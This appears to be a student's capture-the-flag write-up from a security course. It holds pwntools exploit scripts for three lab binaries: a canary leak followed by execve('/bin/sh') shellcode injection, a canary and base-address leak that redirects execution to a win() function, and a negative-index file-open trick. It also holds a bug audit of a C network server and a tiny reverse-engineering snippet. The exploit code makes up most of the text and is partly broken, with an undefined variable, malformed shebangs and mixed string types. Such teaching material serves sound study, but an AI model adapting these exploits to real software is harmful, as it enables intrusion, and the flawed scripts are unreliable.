z5256275 Lachlan Waugh
==========================================================

shellcrack
==========================================================
Flag:
----------------------------------------------------------
    FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNS1zaGVsbGNyYWNrIiwiaXAiOiIxMDEuMTY0LjMzLjIxOSIsInNlc3Npb24iOiJjODA2NGZlZC0xOGI3LTQ0NjgtOWUwYi01NTg2OGY4NDRhM2MifQ.WoTGbau-o2xAB-Av_tQj8y17lKWZSJojILxmAQZ2pKY}

General overview:
----------------------------------------------------------
1. The canary is located next to a buffer that you pass data into, and then read from. If you fill up this buffer, and overwrite the null-byte, this will mean when the data is read it will leak the buffer.
2. You can therefore leak the canary, the address of the buffer you are writing into is also leaked.
3. From this you can construct a simple shellcode payload for execve(bin/sh) which contains the canary.
4. You simply overwrite EIP to point to the buffer, and the buffer contains the shellcode. You also need to ensure that the padding you use to overwrite EIP correctly places the canary back at 0x18 bytes from the EIP.

Script used:
----------------------------------------------------------

```python
#!usr/bin/python

from pwn import *

p = process("./shellcrack")

p.sendlineafter("as:", "A" * 0xF)

# Grab the leaked canary
p.recvuntil("A\n")
canary = p.recvuntil("!", drop=True)

# Grab the leaked buffer address
p.recvuntil("[")
address = int(p.recvuntil("]", drop=True), 16)

# payload to execve /bin/sh
payload = asm("""
    push 0x0068732f
    push 0x6e69622f

    mov eax, 0xb
    mov ebx, esp
    mov ecx, 0x0
    mov edx, 0x0

    int 0x80
""")
# Insert padding to overwrite the EIP
payload += b"\x90" * (0x48 - 0x18 - len(payload))
# Write the canary back in the correct location (0x18 bytes from the EIP)
payload += canary
payload += "\x90" * (0x18 - len(canary))
payload += p32(address)

p.sendline(payload)

p.interactive()
p.close()
```


stack-dump2
==========================================================
Flag:
----------------------------------------------------------
    FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNS1zdGFjay1kdW1wMiIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiYzliMTUzYWYtMjAyMi00NWUzLThlMDYtNTc1MDFhZGU1NjcxIn0.ojSWxnBJ49VcEKrxOzOfe9laeC0Ni59l7DgBi11rOxk}

General overview:
----------------------------------------------------------
1.

Script used:
----------------------------------------------------------

```python
#!usr/bin/python

from pwn import *

def input_data(len, data):
    p.sendlineafter("quit\n", "a")
    p.sendlineafter("len:", str(len))
    p.sendline(data)

def dump_memory():
    p.sendlineafter("quit\n", "b")
    p.recvuntil(": ")
    return p.recvline()

def leak_base():
    p.sendlineafter("quit\n", "c")
    p.recvline()

    base = p.recvuntil("-", drop=True)
    p.recvuntil("[stack]")

    return int(base, 16)

p = process("./stack-dump2")
elf = p.elf

# Leak the address of the canary
p.recvuntil("pointer ")
var75_addr  = int(p.recvline().strip(), 16)
canary = var75_addr + (0x75 - 0xC)

# Find the value of the canary
input_data(5, p32(canary_addr))
canary = dump_memory()[:4]

# Find the binary base from the memory map
elf.address = leak_base()

# Overwrite EIP with win() and the canary with the leaked canary value
payload = b"A" * 0x60
payload += canary
payload += b"A" * 0x8
payload += p32(elf.symbols["win"] - 0x1000)
input_data(len(payload) + 1, payload)

p.sendlineafter("quit\n", "d")

p.interactive()
p.close()
```


image-viewer
==========================================================
General overview:
----------------------------------------------------------
1.

Flag:
----------------------------------------------------------

Script used:
----------------------------------------------------------

```python
#!usr/bin/python

from pwn import *

p = process("./image-viewer")

p.sendlineafter("> ", "trivial")

payload = b"-15" + b" " * 0x5       # the offset between the start of images[] and the start of buf[]
payload += p32(-15 & (0xFFFFFFFF))  # the offset as hex
payload += p32(0x804c060 + 0x10)    # the start of hex in memory + the offset to the following string
payload += "./flat earth truth"     # the name of the file to open
p.sendlineafter("> ", payload)

p.interactive()
p.close()
```

source.c (audit)    
==========================================================
Bugs:
----------------------------------------------------------

1. list_files (Line 116):
    There a possible race condition between writing ls "..." to list.txt and opening the file, it's possible that a person could open list.txt and write this back to the socket (a possible format string exploit?)

2. handle_conn (Line 140):
    The admin_level that allows admin activities seems to be 0 (based on SET_PERMISSION_LEVEL and COMMAND), however this seems to be the default admin_level? I'm a bit confused, wouldn't all of the commands be executed as admin.

3. handle_conn (Line 143):
    both log[] and action[] are of size MAX_LEN, with enough arguments pushed into the action you will truncate the string being copied.

4. handle_conn (Line 146):
    syslog(LOG_INFO, log) is a possible format string, log is a string created with snprintf() and user input, so if action + 1 contained a format string, it could cause an exploit (possibly overriding admin_level which is pushed during the snprintf()).

5. handle_conn (Line 167):
    admin_level is a uint8_t, while level is an int, if you passed in a value larger than 8 bytes it could be truncated when moving it into admin_level, but it will still pass the level != 0 test. (this would require overwriting using the above format string)

6. handle_conn (Line 168):
    There's no break in the switch cases between SET_PERMISSION_LEVEL and COMMAND. You could use the above exploit to set your admin_level to 0 then immediately execute a command.

Theres a number of unchecked return values leading from main -> handle_conn which would mean that an invalid socket or file descriptor could be passed into handle_conn without exiting. <br>
* main (Line 219): doesn't check that the socket returned from setup_networking isn't -1. It just passes it into run_server() <br>
* run_server (Line 210): doesn't check that the fd returned from accept() is valid (which it wouldn't be if socket == -1). It just passes it into handle_conn() <br>
* handle_conn (Lines 137 & 139): never checks whether any bytes are written to/read from the socket. In this case action[] would be uninitialized leading to undefined behaviour. <br>

re
==========================================================
Code:

```C
    int re_this(int arg1, int arg2) {
        return (arg1 + arg2) % 6;
    }
```